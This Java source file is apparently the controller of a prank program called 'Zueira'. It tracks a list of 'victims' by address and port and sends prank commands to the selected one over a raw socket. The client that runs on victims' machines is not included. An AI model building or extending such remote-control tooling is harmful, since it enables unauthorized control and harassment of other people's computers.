package com.master.zueira.controller;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import javax.swing.JOptionPane;

import com.master.zueira.gui.ZueiraMain;
import com.master.zueira.object.Victim;

public class VictimControllerImpl implements VictimController {

	private static final VictimControllerListener WITHOUT_LISTENER = new VictimControllerListener() {

		@Override
		public void changed() {
		}

	};

	private VictimControllerListener listener = VictimControllerImpl.WITHOUT_LISTENER;

	private int selected = -1;

	private final List<Victim> victims = new ArrayList<Victim>();

	public VictimControllerImpl() {
	}

	@Override
	public void addVictim(final String name, final String address, final int service) {
		final Victim victim = new Victim(name, address, service);
		if (!this.victims.contains(victim)) {
			this.victims.add(victim);
			this.listener.changed();
		}
	}

	@Override
	public int count() {
		return this.victims.size();
	}

	@Override
	public Victim getSelectedVictim() {
		if (this.selected != -1) {
			return this.victims.get(this.selected);
		}
		return null;
	}

	@Override
	public Victim getVictim(final int index) {
		return this.victims.get(index);
	}

	public void removeListener() {
		this.listener = VictimControllerImpl.WITHOUT_LISTENER;

	}

	@Override
	public void removeVictim(final String address) {
		final Iterator<Victim> it = this.victims.iterator();
		while (it.hasNext()) {
			if (it.next().getAddress().equals(address)) {
				it.remove();
			}
		}
	}

	@Override
	public void removeVictim(final Victim victim) {
		this.removeVictim(victim.getAddress());
	}

	@Override
	public void setListener(final VictimControllerListener listener) {
		this.listener = listener;
		this.listener.changed();
	}

	@Override
	public void setSelected(final int selected) {
		this.selected = selected;
	}

	@Override
	public void zuar(final String zueira, final String[] labels, final String[] values) {
		final Victim victim = this.getSelectedVictim();
		if (victim == null) {
			JOptionPane.showMessageDialog(ZueiraMain.getInstance(), "Selecione uma vítima", "Zueiraaaaaa", JOptionPane.WARNING_MESSAGE);
			return;
		}
		final StringBuilder send = new StringBuilder(64);
		send.append(1).append("#").append(zueira).append("#");
		for (final String value : values) {
			send.append(value).append(' ');
		}
		Socket s = null;
		try {
			s = new Socket(victim.getAddress(), victim.getService());
			final OutputStream out = s.getOutputStream();
			out.write((send.toString().trim()).getBytes());
			out.flush();
			out.close();
			s.close();
		} catch (final IOException e) {
			this.removeVictim(victim);
		}
	}

}
